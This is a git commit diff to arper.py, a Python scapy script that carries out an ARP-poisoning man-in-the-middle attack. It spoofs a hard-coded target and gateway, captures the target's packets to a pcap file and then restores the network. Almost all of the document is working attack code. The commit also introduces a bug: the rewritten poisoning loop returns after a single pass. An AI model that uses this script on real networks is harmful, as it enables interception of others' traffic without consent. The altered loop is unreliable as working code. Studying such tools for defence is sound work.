51d271b384cdc83fc411bdc55549fe34078e5e86
Avery Uslaner <uslaner.avery@gmail.com>
2018-06-18 20:36:16 -0600

    Gitignore and arper fix
    Added gitignore file to project. Fixed errors with arper.py by deferring
    restoration of target to the end of the script rather than once per
    thread.
    
    Signed-off-by: Avery Uslaner <uslaner.avery@gmail.com>

--- arper.py
+++ arper.py
@@ -1,27 +1,26 @@
+from __future__ import print_function
+
 from scapy.all import *
-import os
 import sys
 import threading
-import signal
+
 
 from scapy.layers.l2 import ARP, Ether
 
 target_ip       = "192.168.1.169"
 gateway_ip      = "192.168.1.1"
 packet_count    = 1000
+poisoning       = True
 
 # turn off output
 conf.verb = 0
 
 
-def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
+def restore_target(g_ip, g_mac, t_ip, t_mac):
     # Slightly different method using send
     print("[*] Restoring target...")
-    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
-    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)
-
-    # Signals the main thread to exit
-    os.kill(os.getpid(), signal.SIGINT)
+    send(ARP(op=2, psrc=g_ip, pdst=t_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=g_mac), count=5)
+    send(ARP(op=2, psrc=t_ip, pdst=g_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=t_mac), count=5)
 
 
 def get_mac(ip_address):
@@ -35,6 +34,8 @@ def get_mac(ip_address):
 
 
 def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
+    global poisoning
+
     poison_target = ARP()
     poison_target.op = 2
     poison_target.psrc = gateway_ip
@@ -49,17 +50,15 @@ def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
 
     print("[*] Beginning the ARP poison. [CTRL-C] to stop]")
 
-    while True:
-        try:
-            send(poison_target)
-            send(poison_gateway)
+    while poisoning:
+        send(poison_target)
+        send(poison_gateway)
 
-            time.sleep(2)
-        except (KeyboardInterrupt, SystemExit):
-            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
+        time.sleep(2)
 
-            print("[*] ARP poison attack finished")
-            return
+        print("[*] ARP poison attack finished")
+
+        return
 
 
 gateway_mac = get_mac(gateway_ip)
@@ -87,13 +86,22 @@ try:
 
     bpf_filter = "ip host " + target_ip
     packets = sniff(count=packet_count, filter=bpf_filter, iface=conf.iface)
-    # Write out the captured packets
-    wrpcap("arper.pcap", packets)
-
-    # Restore the network
-    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
 
 except (KeyboardInterrupt, SystemExit):
+    # Restore the network
+    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
+    sys.exit(0)
+
+finally:
+    # Write out the captured packets
+    print("[*] Writing packets to arper.pcap")
+    wrpcap("arper.pcap", packets)
+
+    poisoning = False
+
+    # Wait for poisoning thread to exit
+    time.sleep(2)
+
     # Restore the network
     restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
     sys.exit(0)
